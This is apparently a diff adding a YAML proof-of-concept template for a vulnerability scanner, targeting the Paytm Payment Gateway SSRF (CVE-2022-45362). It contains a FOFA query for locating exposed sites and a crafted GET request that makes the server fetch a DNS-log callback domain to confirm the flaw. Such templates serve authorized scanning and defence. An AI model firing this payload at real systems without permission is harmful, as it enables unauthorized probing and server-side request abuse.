@@ -1,0 +1,18 @@
+id: poc-yaml-paytm-payment-gateway-ssrf
+info:
+  name: Paytm Payment 服务端请求伪造漏洞(CVE-2022-45362)
+  severity: high
+  tags:
+  - DNSLOG
+  - ssrf
+  - CVE-2022-45362
+  finger: payment_gateway
+  fofa: body="paytm-payments.css" && is_domain=false
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: GET
+  path: /?paytm_action=curltest&url={{.domain}}
+  expression: status_code == 200 && contains(body,"paytm-payments.css") && reverse.Verify()
+transport: http
